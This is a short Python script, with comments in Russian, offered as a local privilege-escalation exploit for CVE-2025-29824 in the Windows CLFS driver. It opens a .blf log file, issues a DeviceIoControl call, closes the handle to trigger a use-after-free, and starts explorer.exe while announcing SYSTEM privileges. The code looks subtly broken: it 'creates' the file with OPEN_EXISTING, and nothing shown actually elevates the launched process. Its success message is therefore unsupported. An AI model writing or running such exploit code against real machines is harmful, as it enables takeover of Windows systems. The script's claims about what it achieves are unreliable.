import ctypes
import os
import sys
from ctypes import wintypes

# Загрузка Windows API
kernel32 = ctypes.WinDLL("kernel32")
advapi32 = ctypes.WinDLL("advapi32")

# Определение констант
GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
FILE_SHARE_READ = 0x00000001
OPEN_EXISTING = 3
CLFS_CONTROL_CODE = 0x8007A808  # Control code для добавления контейнера
PUBLIC_PATH = r"C:\Users\Public\MyLog.blf"

# Функция для создания .blf-файла
def create_blf_file():
    hLog = kernel32.CreateFileW(
        PUBLIC_PATH,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ,
        None,
        OPEN_EXISTING,
        0,
        None
    )
    if hLog == -1:
        print(f"Ошибка создания .blf: {ctypes.GetLastError()}")
        return None
    return hLog

# Функция для эксплуатации use-after-free
def exploit_clfs():
    # Шаг 1: Создание .blf-файла
    hLog = create_blf_file()
    if not hLog:
        return False

    # Шаг 2: Подготовка буфера для DeviceIoControl
    buffer = ctypes.create_string_buffer(0x90)  # Размер для триггера уязвимости
    bytes_returned = wintypes.DWORD()

    # Шаг 3: Вызов DeviceIoControl для добавления контейнера
    success = kernel32.DeviceIoControl(
        hLog,
        CLFS_CONTROL_CODE,
        None,
        0,
        buffer,
        ctypes.sizeof(buffer),
        ctypes.byref(bytes_returned),
        None
    )
    if not success:
        print(f"DeviceIoControl failed: {ctypes.GetLastError()}")
        kernel32.CloseHandle(hLog)
        return False

    # Шаг 4: Закрытие handle для триггера use-after-free
    kernel32.CloseHandle(hLog)

    # Шаг 5: Запуск explorer.exe с привилегиями SYSTEM
    os.system("start explorer.exe")
    return True

if __name__ == "__main__":
    print("Запуск эксплуатации CVE-2025-29824...")
    if exploit_clfs():
        print("Эксплуатация успешна! Проводник запущен с привилегиями SYSTEM.")
    else:
        print("Эксплуатация не удалась.")